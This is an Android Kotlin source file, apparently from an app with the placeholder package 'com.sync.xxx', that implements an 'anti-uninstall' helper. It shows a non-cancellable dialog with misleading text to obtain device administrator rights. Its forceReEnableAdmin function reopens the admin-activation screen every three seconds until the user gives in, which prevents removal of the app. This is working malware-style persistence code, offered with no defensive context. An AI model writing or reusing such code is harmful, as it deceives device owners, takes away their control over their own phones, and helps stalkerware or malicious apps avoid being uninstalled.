package com.sync.xxx

import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log

object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_DIALOG_SHOWN = "admin_dialog_shown"
    private const val KEY_PROTECTION_ENABLED = "protection_enabled"

    fun requestAdminIfNeeded(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)

        // Kalau admin sudah aktif, skip
        if (dpm.isAdminActive(admin)) return

        // Kalau dialog sudah pernah ditampilkan, skip
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        if (prefs.getBoolean(KEY_DIALOG_SHOWN, false)) return

        // Simpan flag dulu biar tidak loop
        prefs.edit().putBoolean(KEY_DIALOG_SHOWN, true).apply()

        // Tampilkan dialog custom DULU, baru ke halaman admin setelah user klik
        AlertDialog.Builder(context)
            .setTitle("Aktifkan Admin")
            .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
            .setCancelable(false)
            .setPositiveButton("Aktifkan") { _, _ ->
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Diperlukan untuk keamanan perangkat.")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
            .show()
    }

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)
        return dpm.isAdminActive(admin)
    }
    
    /**
     * HARDCORE: Force re-enable device admin after it's disabled
     * This will keep trying to re-activate admin
     */
    fun forceReEnableAdmin(context: Context) {
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, AntiUninstallReceiver::class.java)
            
            // If already active, no need to re-enable
            if (dpm.isAdminActive(admin)) {
                Log.d("AntiUninstall", "Admin already active")
                return
            }
            
            // Launch admin activation intent
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Proteksi sistem harus tetap aktif.")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            context.startActivity(intent)
            Log.d("AntiUninstall", "Attempting to re-enable admin")
            
            // Keep retrying every 3 seconds if still not active
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isAdminActive(context)) {
                    forceReEnableAdmin(context)
                }
            }, 3000)
            
        } catch (e: Exception) {
            Log.e("AntiUninstall", "forceReEnableAdmin error: ${e.message}")
        }
    }
    
    /**
     * Enable hardcore protection mode
     */
    fun enableProtection(context: Context) {
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_PROTECTION_ENABLED, true).apply()
        Log.d("AntiUninstall", "Protection mode enabled")
    }
    
    /**
     * Check if protection is enabled
     */
    fun isProtectionEnabled(context: Context): Boolean {
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_PROTECTION_ENABLED, false)
    }
}
